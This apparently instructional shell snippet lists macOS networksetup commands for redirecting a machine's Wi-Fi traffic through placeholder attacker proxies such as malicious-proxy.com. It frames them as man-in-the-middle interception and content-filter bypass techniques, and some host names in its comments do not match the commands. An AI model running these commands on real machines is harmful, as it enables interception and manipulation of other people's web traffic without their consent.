# simulate malicious content injection through the manipulation of proxy settings 

# examples of (TTPs) using macOS networksetup commands to simulate malicious content injection through the manipulation of proxy settings. These techniques illustrate how threat actors could potentially exploit vulnerabilities or misconfigurations in network setups.

# Prerequisites
# macOS environment
# Administrative privileges on the target machine
# Educational purposes only; unauthorized use is strictly prohibited
# Examples

# 1. Traffic Interception
# Set web proxy to redirect traffic
networksetup -setwebproxy "Wi-Fi" <proxy.redirect.com> 8080

# Configure proxy bypass for internal domains
networksetup -setproxybypassdomains "Wi-Fi" "*.internal.lan" "*.local"
# In this example, a web proxy is configured to redirect Wi-Fi traffic through proxy.example.com on port 8080. The *.internal.lan and *.local domains are exempted from proxying.

# 2. Man-in-the-Middle (MitM) Attack
# Set web proxy to control communication
networksetup -setwebproxy "Wi-Fi" <malicious-proxy.com> 8888
# Capture traffic and perform MitM attacks
# (Additional tools like Wireshark or mitmproxy might be used)
# This example configures a web proxy to malicious-proxy.com on port 8888, enabling an attacker to capture and manipulate communication between the target machine and web servers.

# 3. Bypassing Content Filters
# Set web proxy to bypass content filters
networksetup -setwebproxy "Wi-Fi" <yourbypass-proxy.com> 8080

# Disable proxy for specified domains
networksetup -setproxybypassdomains "Wi-Fi" <"restricted-site1.com"> <"restricted-site2.com">
# Here, a web proxy is set to bypass-proxy.com on port 8080, and specific domains are exempted from proxying to circumvent content filters.
